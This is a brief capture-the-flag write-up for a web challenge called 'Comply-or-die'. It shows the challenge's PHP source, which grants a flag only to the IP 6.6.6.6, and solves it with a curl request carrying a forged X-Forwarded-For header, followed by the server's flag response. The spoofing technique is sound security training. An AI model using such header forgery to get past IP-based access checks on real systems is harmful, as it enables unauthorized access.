# Web CTF Final Comply-or-die

The page displays your IP and the message “Invalid IP!” unless your IP is exactly 6.6.6.6. The PHP source code shown is:

```php
<?php
include("flag.php");

$ip = getYours();

echo $ip;

if ($ip == "6.6.6.6")
    echo " $message . $flag";
else
    echo " Invalid IP!";

show_source(__FILE__);
?>
```

To retrieve the flag, you need to make `$ip` equal **6.6.6.6**.

We can send a forged X-Forwarded-For header to trick the server into thinking our IP is 6.6.6.6. Using curl:

```bash
curl -H "X-Forwarded-For: 6.6.6.6" http://ctf-13.security.cs.pub.ro:8006/
```

The server responds with:

```
6.6.6.6 Yeah, Yeah, take it and leave it.. . SSS{It_has_to_be_what_it_has_to_be}
```
